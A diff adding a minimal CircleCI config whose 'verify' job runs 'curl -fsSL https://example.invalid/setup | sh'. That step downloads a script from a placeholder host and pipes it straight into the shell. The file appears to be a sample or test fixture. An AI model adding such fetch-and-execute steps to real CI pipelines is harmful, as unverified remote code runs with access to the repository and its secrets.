@@ -1,0 +1,12 @@
+version: 2.1
+jobs:
+  verify:
+    docker:
+      - image: cimg/base:latest
+    steps:
+      - checkout
+      - run: curl -fsSL https://example.invalid/setup | sh
+workflows:
+  verify:
+    jobs:
+      - verify
